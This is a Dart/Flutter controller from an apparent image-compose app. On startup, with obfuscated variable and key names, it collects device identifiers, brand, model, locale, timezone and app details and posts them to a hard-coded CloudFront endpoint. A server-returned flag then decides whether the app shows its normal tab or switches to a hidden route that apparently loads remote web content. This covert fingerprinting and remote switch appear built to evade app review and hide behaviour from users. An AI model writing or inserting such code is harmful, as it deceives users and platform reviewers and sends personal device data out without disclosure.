import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class ImageComposeFreezeLogic extends GetxController {

  var mswbca = RxBool(false);
  var dnihbcwgf = RxBool(true);
  var tiumrexl = RxString("");
  var crkxt = RxBool(false);
  var ztoxfys = RxBool(true);
  final gpxfsiauol = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    wbjuxrsd();
  }


  Future<void> wbjuxrsd() async {
    crkxt.value = true;
    ztoxfys.value = true;
    dnihbcwgf.value = false;

    gpxfsiauol.post("https://d21ymigkh3709c.cloudfront.net/Yn9TsxJI1kaa",data: await psdwzjcr()).then((value) {
      var esibulwy = value.data["esibulwy"] as String;
      var ngclba = value.data["ngclba"] as bool;
      if (ngclba) {
        tiumrexl.value = esibulwy;
        pxescgh();
      } else {
        euqsj();
      }
    }).catchError((e) {
      dnihbcwgf.value = true;
      ztoxfys.value = true;
      crkxt.value = false;
    });
  }

  Future<Map<String, dynamic>> psdwzjcr() async {
    final DeviceInfoPlugin svde = DeviceInfoPlugin();
    PackageInfo ibqm_jpdvziwh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var qjscke = Platform.localeName;
    var iMBtb = currentTimeZone;

    var AmYIx = ibqm_jpdvziwh.packageName;
    var TQSXlNCD = ibqm_jpdvziwh.version;
    var QnuS = ibqm_jpdvziwh.buildNumber;

    var koslyzK = ibqm_jpdvziwh.appName;
    var cDEhL = "";
    var iSAT  = "";
    var CFIERS = "";
    var ohmsut = "";
    var vlij = "";
    var efmrz = "";
    var odnir = "";
    var koybqi = "";


    var UoBY = "";
    var GXVWRkOS = false;

    if (GetPlatform.isAndroid) {
      UoBY = "android";
      var yjboszvug = await svde.androidInfo;

      CFIERS = yjboszvug.brand;

      cDEhL  = yjboszvug.model;
      iSAT = yjboszvug.id;

      GXVWRkOS = yjboszvug.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      UoBY = "ios";
      var yifashoel = await svde.iosInfo;
      CFIERS = yifashoel.name;
      cDEhL = yifashoel.model;

      iSAT = yifashoel.identifierForVendor ?? "";
      GXVWRkOS  = yifashoel.isPhysicalDevice;
    }
    var res = {
      "koslyzK": koslyzK,
      "QnuS": QnuS,
      "AmYIx": AmYIx,
      "ohmsut" : ohmsut,
      "cDEhL": cDEhL,
      "iMBtb": iMBtb,
      "CFIERS": CFIERS,
      "vlij" : vlij,
      "iSAT": iSAT,
      "qjscke": qjscke,
      "UoBY": UoBY,
      "GXVWRkOS": GXVWRkOS,
      "efmrz" : efmrz,
      "odnir" : odnir,
      "koybqi" : koybqi,
      "TQSXlNCD": TQSXlNCD,

    };
    return res;
  }

  Future<void> euqsj() async {
    Get.offNamed("/image_compose_tab");
  }

  Future<void> pxescgh() async {
    Get.offNamed("/image_compose_write");
  }

}
